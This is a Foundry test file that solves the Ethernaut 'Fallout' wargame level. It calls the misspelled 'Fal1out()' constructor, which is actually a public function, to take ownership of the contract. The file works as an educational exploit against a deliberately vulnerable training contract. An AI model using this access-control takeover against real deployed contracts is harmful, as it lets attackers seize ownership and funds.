// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";

/// Ethernaut #2 "Fallout" → SC01 access control (`unprotected-privileged-fn` family). The intended
/// constructor is misspelled `Fal1out()`, so it's an ordinary public function anyone can call to
/// become owner. Win: owner == player. (Fallout is ^0.6 → deployed via `deployCode`.)
interface IFallout {
    function Fal1out() external payable;
    function owner() external view returns (address);
}

contract FalloutTest is Test {
    address player = makeAddr("player");

    function test_solve_fallout() public {
        address lvl = deployCode("Fallout.sol:Fallout");
        vm.prank(player);
        IFallout(lvl).Fal1out();
        assertEq(IFallout(lvl).owner(), player, "owner via the misnamed 'constructor'");
    }
}
